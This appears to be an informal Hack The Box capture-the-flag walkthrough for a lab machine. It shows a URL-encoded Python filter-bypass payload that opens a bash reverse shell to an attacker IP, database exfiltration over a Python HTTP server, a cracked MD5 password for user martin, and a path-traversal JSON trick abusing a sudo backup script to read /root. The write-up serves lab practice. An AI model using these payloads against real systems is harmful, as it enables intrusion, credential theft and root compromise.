
![Code](https://github.com/user-attachments/assets/965bd010-eb39-4023-bf9d-caa94809d4ca)


found a  python gunicorn service runnning on 5000 port 

go on it , you find a python interpreter that filter some strings we could use to gain rce , informating about the technology , i came across , Ace 1.4.12 
	As it said , it has some vulns allows to do arbritary code execution

from a specific internet forum , i got 

		module%20%3d%20globals()%5b'o'%2b's'%5d%0acommand%20%3d%20getattr(module%2c%20'sy'%2b'stem')%0acommand('bash%20-c%20%22bash%20-i%20%3e%26%20%2fdev%2ftcp%2f[ip]%2f9001%200%3e%261%22')

so intercept the run button request in burp and replace the value of variable code by the payload given above , and seting up a nc listenner 
you got a user flag

enumerating using linpeas , i saw some app running and it's folder is dropped in the user we are directory 

#so you'll find a database file in /home/app-production/app/instance/database.db
	donwload it to your machine 

on target machine: run in the folder were the database is : 
		python3 -m http.server 
#it will start a local python server on 8000 port by default 

on your machine :	
 		wget http://IP:PORT/database.db

Open it using sqlite databse browser , and view in the user's table ; you'll see users development and martin , 
	in /home folder is a user named martin , so take his pass hash and decode it 
	it md5 one 
		martin : nafeelswordsmaster


log using ssh now  martin@IP  ; pass the password , get connected 
 
			for root once you connected 
			sudol -l 

	privesc 
		cat > /home/martin/backups/task.json << EOF
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/var/....//root/"
  ]
}
EOF


so run now : sudo /usr/bin/backy.sh /home/martin/backups/task.json

go now onto /home/martin/backups/
	ls -la , you'll see backups files , download them , unzip them and enjoy the root flag 

	ls -l
	wget http://IP:PORT/code_var_.._root_2025_March.tar.bz2
	
	tar -xvjf code_home_martinbackups*.tar.bz2
	cat root/root.txt

![Screenshot 2025-05-05 at 05-14-08 Hack The Box Hack The Box](https://github.com/user-attachments/assets/7462e83e-394c-4a82-9215-6d6173ef7e39)

#ArtemisTEAM
